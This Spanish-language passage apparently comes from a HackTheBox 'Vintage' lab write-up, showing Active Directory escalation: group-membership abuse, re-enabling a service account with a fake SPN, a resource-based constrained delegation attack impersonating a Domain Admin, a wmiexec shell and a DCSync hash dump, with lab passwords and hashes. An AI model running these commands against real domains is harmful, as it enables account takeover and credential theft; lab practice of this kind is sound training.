En nuestro caso, usamos tanto **bloodyAD** como **PowerView.py**, ya que ambas permiten realizar esta acción utilizando un TGT en caché.

En ambas herramientas nos conectamos a través de Kerberos mediante el TGT (`.ccache`) cargado en la variable `KRB5CCNAME` y añadimos al usuario `P.Rosa` al grupo mencionado.

> Tenemos la variable de entorno `FQDN` creada anteriormente que tiene como valor: **dc01.vintage.htb** y la variable de entorno `IP` que tiene como valor la dirección IP de **Vintage** - **10.10.11.45**.
{: .prompt-danger }

**bloodyAD**

```bash
❯ bloodyAD -d vintage.htb --host "$FQDN" -k add groupMember 'SERVICEMANAGERS' 'P.Rosa'
[+] P.Rosa added to SERVICEMANAGERS
```

**PowerView.py**

```bash
❯ powerview vintage.htb/'GMSA01$'@"$FQDN" -k --no-pass --dc-ip "$IP"
Logging directory is set to /home/gzzcoo/.powerview/logs/vintage-gmsa01$-dc01.vintage.htb
[2025-04-24 23:58:37] [Storage] Using cache directory: /home/gzzcoo/.powerview/storage/ldap_cache

(LDAP)-[dc01.vintage.htb]-[VINTAGE\gMSA01$]
PV > Add-DomainGroupMember -Identity 'SERVICEMANAGERS' -Members 'P.Rosa'
[2025-04-24 23:59:18] User P.Rosa successfully added to SERVICEMANAGERS
```


**Asignar un SPN ficticio al usuario SQL\_SVC**

El siguiente paso será asignar un SPN (Service Principal Name) ficticio al usuario `svc_sql`. Lo haremos utilizando la cuenta `P.Rosa`, que acabamos de volver a añadir al grupo `SERVICEMANAGERS`, ya que este grupo tiene permisos de `GenericAll` sobre las tres cuentas `svc`.

Para ello, primero solicitaremos el TGT (Ticket Granting Ticket) del usuario `P.Rosa@vintage.htb` usando `getTGT.py` de Impacket. Una vez obtenido el TGT en formato `.ccache`, lo exportaremos en la variable `KRB5CCNAME` y validaremos con `klist` que se haya cargado correctamente en nuestra sesión.

> Tenemos la variable de entorno `IP` creada anteriormente que tiene como valor: **10.10.11.45**
{: .prompt-danger }

```bash
❯ impacket-getTGT vintage.htb/P.Rosa:'Rosaisbest123' -dc-ip "$IP"
Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in P.Rosa.ccache

❯ export KRB5CCNAME=$(pwd)/P.Rosa.ccache

❯ klist
Ticket cache: FILE:/home/gzzcoo/Desktop/HackTheBox/Labs/Windows/AD/Vintage/content/P.Rosa.ccache
Default principal: P.Rosa@VINTAGE.HTB

Valid starting       Expires              Service principal
04/25/2025 04:02:40  04/25/2025 14:02:40  krbtgt/VINTAGE.HTB@VINTAGE.HTB
	renew until 04/26/2025 04:00:03
```

Si bien recordamos, el usuario `svc_sql` se encontraba deshabilitado, por lo que primero necesitaremos modificar su `userAccountControl` (UAC) para volver a habilitarlo. Una vez hecho esto, podremos asignarle un SPN ficticio.

Ambas acciones las podemos realizar utilizando `bloodyAD` o `PowerView.py`, autenticándonos mediante Kerberos con el TGT (`.ccache`) que ya tenemos cargado en la variable `KRB5CCNAME`.

> Tenemos la variable de entorno `FQDN` creada anteriormente que tiene como valor: **dc01.vintage.htb** y la variable de entorno `IP` que tiene como valor la dirección IP de **Vintage** - **10.10.11.45**.
{: .prompt-danger }

**bloodyAD**

```bash
❯ bloodyAD --host "$FQDN" -d vintage.htb -k remove uac 'SVC_SQL' -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from SVC_SQLs userAccountControl

❯ bloodyAD --host "$FQDN" -d vintage.htb -k set object 'SVC_SQL' servicePrincipalName -v 'cifs/gzzcoo'
[+] SVC_SQL's servicePrincipalName has been updated
```

**PowerView.py**

```bash
❯ powerview vintage.htb/'P.Rosa'@"$FQDN" -k --no-pass --dc-ip "$IP"
Logging directory is set to /home/gzzcoo/.powerview/logs/vintage-p.rosa-dc01.vintage.htb
[2025-04-25 00:43:13] [Storage] Using cache directory: /home/gzzcoo/.powerview/storage/ldap_cache

(LDAP)-[dc01.vintage.htb]-[VINTAGE\P.Rosa]
PV > Set-DomainObject -Identity "SVC_SQL" -Set 'userAccountControl=66048'
[2025-04-25 00:56:56] [Set-DomainObject] Success! modified attribute useraccountcontrol for CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb

(LDAP)-[dc01.vintage.htb]-[VINTAGE\P.Rosa]
PV > Set-DomainObject -Identity 'SVC_SQL' -Set 'servicePrincipalname=cifs/gzzcoo'
[2025-04-25 00:57:42] [Set-DomainObject] Success! modified attribute serviceprincipalname for CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb
```


**Resource-based Constrained Delegation Attack with SQL\_SVC**

Una vez en este punto, tenemos el escenario perfecto para llevar a cabo un ataque de **Resource-Based Constrained Delegation (RBCD Attack)**:

* El usuario `svc_sql@vintage.htb` forma parte del grupo `DELEGATEDADMINS`, cuyos miembros tienen permiso ACL de `AllowedToAct` sobre el Domain Controller.
* El usuario `svc_sql@vintage.htb` ya tiene asignado un SPN (Service Principal Name) ficticio, requisito necesario para realizar el ataque.
* Tenemos un objetivo claro, `l.bianchi_adm@vintage.htb`, que es miembro de `Domain Admins` y que queremos suplantar.

Teniendo este escenario listo, el primer paso será solicitar el **TGT (Ticket Granting Ticket)** del usuario `svc_sql@vintage.htb` utilizando la herramienta `getTGT.py` de Impacket.

Una vez solicitado el TGT, obtendremos un archivo `.ccache`, el cual exportaremos en la variable `KRB5CCNAME` y validaremos con `klist` que esté correctamente cargado en nuestra sesión.

> Tenemos la variable de entorno `IP` creada anteriormente que tiene como valor: **10.10.11.45**
{: .prompt-danger }

```bash
❯ impacket-getTGT vintage.htb/svc_sql:'Zer0the0ne' -dc-ip "$IP"
Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_sql.ccache

❯ export KRB5CCNAME=$(pwd)/svc_sql.ccache

❯ klist
Ticket cache: FILE:/home/gzzcoo/Desktop/HackTheBox/Labs/Windows/AD/Vintage/content/svc_sql.ccache
Default principal: svc_sql@VINTAGE.HTB

Valid starting       Expires              Service principal
04/25/2025 04:05:00  04/25/2025 14:05:00  krbtgt/VINTAGE.HTB@VINTAGE.HTB
	renew until 04/26/2025 04:02:23
```

Para ejecutar el Resource-Based Constrained Delegation Attack (RBCD), utilizamos la herramienta `getST.py` de la suite Impacket. El objetivo es obtener un TGS (Ticket Granting Service) suplantando al usuario `l.bianchi_adm@vintage.htb` para acceder al Domain Controller.

El ataque se basa en el funcionamiento normal de la delegación Kerberos:

* Primero realizamos un **S4U2Self**, donde solicitamos un ticket de servicio a nombre del usuario `l.bianchi_adm`, usando el SPN ficticio que habíamos asignado previamente a `svc_sql`.
* Luego realizamos un **S4U2Proxy**, donde pedimos al KDC que nos permita usar ese ticket para acceder al servicio `cifs/dc01.vintage.htb`, aprovechando el permiso `AllowedToAct` que tiene `svc_sql` sobre el DC.

En el resultado vemos que primero se completa el `S4U2Self`, luego el `S4U2Proxy`, y finalmente se guarda el ticket suplantando a `l.bianchi_adm` en el archivo `.ccache`.

> Tenemos la variable de entorno `IP` creada anteriormente que tiene como valor: **10.10.11.45**
{: .prompt-danger }

```bash
❯ impacket-getST vintage.htb/svc_sql:'Zer0the0ne' -k -no-pass -dc-ip "$IP" -spn 'cifs/dc01.vintage.htb' -impersonate l.bianchi_adm
Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating l.bianchi_adm
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in l.bianchi_adm@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
```

Exportamos el nuevo `.ccache` que contiene el TGS de suplantación del usuario `l.bianchi_adm`, utilizando la variable `KRB5CCNAME`, y verificamos con `klist` que el ticket esté correctamente cargado en nuestra sesión.

Una vez confirmado, nos conectamos al Domain Controller `dc01.vintage.htb` utilizando la herramienta `wmiexec.py` de Impacket, autenticándonos directamente mediante Kerberos y sin necesidad de introducir contraseña.

La conexión se establece correctamente, obteniendo una shell bajo el contexto de `l.bianchi_adm`. Desde esta sesión, confirmamos que disponemos de privilegios de Domain Admin y accedemos al escritorio del usuario `Administrator`, donde logramos obtener finalmente la flag **root.txt**

> Tenemos la variable de entorno `FQDN` creada anteriormente que tiene como valor: **dc01.vintage.htb**
{: .prompt-danger }


```bash
❯ export KRB5CCNAME=$(pwd)/l.bianchi_adm@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache

❯ klist
Ticket cache: FILE:/home/gzzcoo/Desktop/HackTheBox/Labs/Windows/AD/Vintage/content/l.bianchi_adm@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
Default principal: l.bianchi_adm@vintage.htb

Valid starting       Expires              Service principal
04/25/2025 04:07:46  04/25/2025 14:05:00  cifs/dc01.vintage.htb@VINTAGE.HTB
	renew until 04/26/2025 04:02:23
	
❯ impacket-wmiexec "$FQDN" -k -no-pass
Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands

C:\>type C:\Users\Administrator\Desktop\root.txt
5cc5*******************dfe0ecb2d
```

***
### Resource-based Constrained Delegation Attack (RBCD Attack) with FS01$

Por otro lado, también podemos realizar este mismo ataque de RBCD utilizando la cuenta `FS01$`, de la cual disponemos credenciales y que ya tiene un **SPN (ServicePrincipalName)** asignado por defecto.

El proceso es el mismo: utilizando la cuenta `C.Neri_adm`, añadimos `FS01$` al grupo `DELEGATEDADMINS` para que disponga del privilegio ACL **AllowedToAct**.

Solicitamos el **TGT (Ticket Granting Ticket)** de `FS01$` y realizamos el ataque de **RBCD** mediante la herramienta **getST.py** de **Impacket**, autenticándonos con la cuenta `FS01$` y logrando suplantar al **Domain Admin**: `L.Bianchi_adm@vintage.htb`.

> Tenemos la variable de entorno `FQDN` creada anteriormente que tiene como valor: **dc01.vintage.htb** y la variable de entorno `IP` que tiene como valor la dirección IP de **Vintage** - **10.10.11.45**.
{: .prompt-danger }

```bash
❯ impacket-getTGT vintage.htb/c.neri_adm:Uncr4ck4bl3P4ssW0rd0312 -dc-ip "$IP"
Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in c.neri_adm.ccache

❯ export KRB5CCNAME=$(pwd)/c.neri_adm.ccache

❯ klist
Ticket cache: FILE:/home/gzzcoo/c.neri_adm.ccache
Default principal: c.neri_adm@VINTAGE.HTB

Valid starting       Expires              Service principal
04/26/2025 17:35:17  04/27/2025 03:35:17  krbtgt/VINTAGE.HTB@VINTAGE.HTB
	renew until 04/27/2025 17:35:49
	
❯ bloodyAD -d vintage.htb --host "$FQDN" -k add groupMember 'DELEGATEDADMINS' 'fs01$'
[+] fs01$ added to DELEGATEDADMINS

❯ impacket-getTGT vintage.htb/'fs01$':fs01 -dc-ip "$IP"
Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in fs01$.ccache

❯ export KRB5CCNAME=$(pwd)/'fs01$.ccache'

❯ impacket-getST vintage.htb/'fs01$':'fs01'  -dc-ip "$IP" -spn 'cifs/dc01.vintage.htb' -impersonate l.bianchi_adm
Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating l.bianchi_adm
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in l.bianchi_adm@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
❯ KRB5CCNAME=l.bianchi_adm@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache impacket-wmiexec "$FQDN" -k -no-pass
Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
vintage\l.bianchi_adm

C:\>type C:\Users\Administrator\Desktop\root.txt
f13***********************d7b3760
```

***
### Extra: Dumping NTDS.dit to retrieve all NTLM hashes

Ya que disponemos de privilegios de Domain Admin en el dominio `vintage.htb` a través del usuario `l.bianchi_adm@vintage.htb`, podemos aprovechar para realizar un ataque de tipo **DCSync** y extraer todos los hashes NTLM almacenados en el `NTDS.dit`, que es la base de datos utilizada por Active Directory para guardar toda la información del dominio, incluidas las credenciales de los usuarios.

Esto nos permite tener acceso completo a cualquier cuenta del dominio sin necesidad de conocer sus contraseñas, ya que disponiendo del hash NTLM podemos realizar ataques como **Pass-the-Hash (PtH)**.

> Tenemos la variable de entorno `FQDN` creada anteriormente que tiene como valor: **dc01.vintage.htb**
{: .prompt-danger }

```bash
❯ impacket-secretsdump vintage.htb/l.bianchi_adm@"$FQDN" -k -no-pass -just-dc-ntlm
Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:468c7497513f8243b59980f2240a10de:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:be3d376d906753c7373b15ac460724d8:::
M.Rossi:1111:aad3b435b51404eeaad3b435b51404ee:8e5fc7685b7ae019a516c2515bbd310d:::
R.Verdi:1112:aad3b435b51404eeaad3b435b51404ee:42232fb11274c292ed84dcbcc200db57:::
L.Bianchi:1113:aad3b435b51404eeaad3b435b51404ee:de9f0e05b3eaa440b2842b8fe3449545:::
G.Viola:1114:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::
C.Neri:1115:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
P.Rosa:1116:aad3b435b51404eeaad3b435b51404ee:8c241d5fe65f801b408c96776b38fba2:::
svc_sql:1134:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
svc_ldap:1135:aad3b435b51404eeaad3b435b51404ee:458fd9b330df2eff17c42198627169aa:::
svc_ark:1136:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::
C.Neri_adm:1140:aad3b435b51404eeaad3b435b51404ee:91c4418311c6e34bd2e9a3bda5e96594:::
L.Bianchi_adm:1141:aad3b435b51404eeaad3b435b51404ee:6b751449807e0d73065b0423b64687f0:::
DC01$:1002:aad3b435b51404eeaad3b435b51404ee:2dc5282ca43835331648e7e0bd41f2d5:::
gMSA01$:1107:aad3b435b51404eeaad3b435b51404ee:b3a15bbdfb1c53238d4b50ea2c4d1178:::
FS01$:1108:aad3b435b51404eeaad3b435b51404ee:44a59c02ec44a90366ad1d0f8a781274:::
[*] Cleaning up... 
```